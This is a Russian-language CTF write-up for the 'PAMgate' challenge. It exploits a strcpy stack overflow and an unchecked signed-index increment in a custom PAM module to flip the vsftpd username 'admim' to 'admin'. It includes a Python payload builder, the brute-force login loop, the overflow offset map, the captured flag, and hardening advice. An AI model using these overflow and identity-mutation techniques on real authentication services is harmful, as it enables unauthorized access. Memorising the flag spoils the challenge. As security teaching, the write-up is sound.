# PAMgate — технический разбор

**Флаг:** `avito{3a5Y_4DMIN_1NCREmeNt}`

**Класс:** Linux pwn / PAM / stack buffer overflow / out-of-bounds increment / identity mutation

## Краткое техническое резюме

Custom PAM module `pam_pamgate.so` копирует FTP password через `strcpy` в 10-byte stack buffer.
Overflow позволяет одновременно заменить TOTP secret и signed journal index. После успешной TOTP
verification модуль выполняет unchecked `g[(int16_t)idx]++`, что даёт data-only increment primitive
в heap process.

Легальный virtual username `admim` отличается от запрещённого `admin` одним byte:
`'m'` (`0x6d`) + 1 = `'n'` (`0x6e`). Aligned sweep journal index обнаруживает allocation layout,
при котором increment изменяет пятый byte строки `PAM_USER`. `vsftpd` перечитывает mutated
`PAM_USER` после `pam_authenticate()` и применяет `local_root=/srv/ftp/$USER`, поэтому та же FTP
session получает chroot `/srv/ftp/admin` и читает `flag.txt`.

**Для воспроизведения:** Solver запускается на машине задания под `player`: адрес `127.0.0.1:30029` относится к её FTP-сервису. SSH-подключение и перенос stdlib-скрипта выполняются до запуска перебора.

## 1. Контекст и цель

SSH endpoint предоставляет shell пользователя `player`; внутренний `vsftpd` слушает
`127.0.0.1:30029`. FTP authentication делегирована PAM service `pamgate`.

Configuration использует virtual users:

```text
guest_enable=YES
guest_username=ftpvirt
local_root=/srv/ftp/$USER
chroot_local_user=YES
```

Все FTP sessions выполняются от OS account `ftpvirt`, но filesystem root зависит от PAM username.
Целевой файл `/srv/ftp/admin/flag.txt` доступен только session с итоговым `PAM_USER=admin`.

User store изначально не содержит `admin`; enrollment запрещает names `admin` и `guest`. Допустимый
alphabet: `[A-Za-z0-9_-]`, длина 1–32.

## 2. Разведка и поверхность атаки

Восстановленный authentication path:

```c
pam_get_user(pamh, &user, NULL);
get_authtok(pamh, &password);
g = calloc(256, 1);
found = userstore_lookup(user, &record);

if (!found) {
    if (strcmp(password, "enroll") != 0) return PAM_AUTH_ERR;
    validate_name(user);
    userstore_create(user);
    return PAM_SUCCESS;
}

memset(buf, 0, 10);
jidx = record.index;
strcpy(buf, password);
if (!otp_verify(buf, record.secret)) return PAM_AUTH_ERR;
g[(int16_t)jidx]++;
write_stats(user, g[(int16_t)jidx]);
return PAM_SUCCESS;
```

Module выполняется в privileged PAM context до privilege drop и chroot `vsftpd`. Stack frame не
защищён canary. FTP command encoding запрещает `0x00`, `0x0a` и `0x0d`, но принимает остальные
bytes через Latin-1 mapping.

## 3. Анализ и проверка гипотез

Карта overflow:

| Password offset | Target | Primitive |
|---|---|---|
| `[0:k]` | `buf` | TOTP digits, parsed через `atoi` |
| `[7:9]` | journal index | signed `int16_t` offset для `g[idx]` |
| `[46:62]` | `record.secret` | TOTP secret replacement до verification |
| `[74:82]` | saved `PAM_USER` pointer | pointer corruption |
| `[90:98]` | saved RBP | stack frame corruption |
| `[98:106]` | saved RIP | control-flow hijack |

Secret replacement обеспечивает valid TOTP для любого существующего account, но не создаёт record
`admin`. Saved RIP control подтверждён, однако available libc gadgets не удовлетворяют register и
pointer constraints caller `libpam`; этот путь не нужен для решения. Corruption saved `PAM_USER`
pointer также не даёт стабильный write target без stack disclosure.

Рабочий primitive — unchecked signed index. `g` и строка `PAM_USER` находятся в heap одного forked
`vsftpd` process. Enrollment `admim` проходит validation. Затем overflow устанавливает известный
TOTP secret и перебирает отрицательные indices, пока `g[idx]++` не попадает в byte `'m'`.

Heap layout зависит от allocations OpenSSL и меняется между FTP connections. Поэтому обнаружение
mutation и `RETR flag.txt` должны выполняться в одной session. Рабочий aligned search использует
range `[-0x2000, -0x6c0)` и condition `idx & 0xf == 4`. Зафиксированный hit:

```text
idx = -6940
wire encoding = e4 e4
PAM_USER: admim -> admin
```

`stats.txt` возвращает `logins: 110`; `110 == 0x6e == 'n'`, что независимо подтверждает попадание в
целевой byte.

## 4. Корневая причина

1. `strcpy` допускает stack buffer overflow в privileged PAM module.
2. Attacker-controlled signed index используется без bounds check для 256-byte journal buffer.
3. TOTP secret находится в той же mutable stack frame и заменяется до verification.
4. Username validation выполняется только при enrollment, а `PAM_USER` остаётся mutable между
   authentication и use в `vsftpd`.
5. `vsftpd` строит security-sensitive `local_root` из значения `PAM_USER`, возвращённого после PAM.

Итоговый exploit является data-only attack: control flow не изменяется, но trusted identity
mutation изменяет authorization context и chroot target.

## 5. Эксплуатация

Payload для заданного `idx`:

```python
SECRET = b"AAAAAAAAAAAAAAAA"

def password(idx: int) -> str:
    payload = bytearray(b"P" * 62)
    payload[:6] = otp(SECRET)
    payload[6] = ord("X")
    payload[7:9] = struct.pack("<h", idx)
    payload[46:62] = SECRET
    return bytes(payload).decode("latin-1")
```

Последовательность:

1. Зарегистрировать `admim` командой `USER admim` / `PASS enroll`.
2. Для каждого aligned index открыть FTP connection и выполнить login payload.
3. В той же session получить `stats.txt`.
4. При `user: admin` немедленно выполнить `RETR flag.txt`, не закрывая connection.

Критическая часть loop:

```python
ftp.login("admim", password(idx))
ftp.retrbinary("RETR stats.txt", stats.write)
if b"user: admin" in stats.getvalue():
    ftp.retrbinary("RETR flag.txt", flag.write)
```

Полный sweep запускается **на машине задания**, после переноса туда `offset_sweep.py`:

```bash
python3 /tmp/offset_sweep.py
```

Источник скрипта в репозитории — `pamgate/agents/username_flip_reopen/offset_sweep.py`.
Он использует только стандартную библиотеку Python и подключается к FTP на `127.0.0.1:30029`
этой машины. Запуск той же команды на рабочем компьютере без доступа к FTP не проверяет атаку.

One-shot replay с `idx=-6940` находится в `fetch_flag.py`, но не гарантирован для нового process из-за
ASLR и heap-layout variability.

## 6. Флаг

```text
avito{3a5Y_4DMIN_1NCREmeNt}
```

Зафиксированный response:

```text
HIT {"idx": -6940, "idx_hex": "e4e4", "login": "230 Login successful.",
     "logins": 110, "stats": "user: admin\nlogins: 110\n",
     "user": "admin", "flag": "avito{3a5Y_4DMIN_1NCREmeNt}\n"}
```

## 7. Выводы и рекомендации

- Исключить unbounded string functions в privileged native modules; использовать size-aware APIs,
  stack canaries, PIE, RELRO и `FORTIFY_SOURCE`.
- Проверять `0 <= idx < journal_size` непосредственно перед memory access.
- Не размещать authentication records и attacker-derived control fields в одной mutable stack frame.
- Считать `PAM_USER` immutable после validation либо повторно валидировать его непосредственно перед
  построением `local_root`.
- Не строить authorization boundary только из user-controlled path component; использовать stable
  internal user ID и explicit mapping.
- Тестировать PAM modules с binary inputs, negative indices и cross-request heap-layout variation.

## 8. Файлы для воспроизведения

В репозитории:

- `pamgate/agents/username_flip_reopen/offset_sweep.py` — aligned index sweep с чтением flag в той же
  FTP session.
- `pamgate/agents/username_flip_reopen/fetch_flag.py` — replay для известного offset.
- `pamgate/task.md` — protocol parameters и исходный доступ.

Анализируемый `pamgate/pam_pamgate.so` и raw server responses не входят в
набор файлов в Git.
